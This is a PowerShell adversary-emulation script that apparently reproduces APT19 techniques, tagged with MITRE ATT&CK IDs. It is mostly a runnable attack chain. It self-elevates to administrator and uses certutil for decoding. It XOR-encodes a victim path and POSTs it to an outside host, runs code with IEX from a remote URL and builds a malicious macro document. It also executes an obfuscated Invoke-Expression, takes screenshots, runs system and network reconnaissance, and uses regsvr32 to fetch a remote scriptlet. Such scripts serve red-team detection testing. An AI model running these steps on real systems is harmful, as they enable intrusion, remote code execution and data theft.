#apt 19 modified attack

#self elevate script
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
 if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
  $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
  Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
  Exit
 }
}

#T1071.001
Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null

#T1140
cmd.exe /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt
cmd.exe /c certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe

#T1132.001
$plaintext = ([system.Text.Encoding]::UTF8.getBytes("Path\n----\nC:\Users\victim"))
$key = "abcdefghijklmnopqrstuvwxyz123456"
$cyphertext =  @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
[System.Net.ServicePointManager]::Expect100Continue = $false
Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive

#T1204.002
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

#T1027
$cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )

#T1033
cmd.exe /C whoami 

#T1113
Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save("$env:TEMP\T1113.png")

#T1016
cmd.exe /c ipconfig /all
cmd.exe /c netsh interface show
cmd.exe /c arp -a
cmd.exe /c net config

#T1033
cmd.exe /c wmic useraccount get /ALL

#T1082
cmd.exe /c systeminfo
cmd.exe /c reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum

#T1117
cmd.exe /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll

#
cmd.exe /c echo "apt19 done" > apt19outputstop.txt
cmd.exe /c apt19outputstop.txt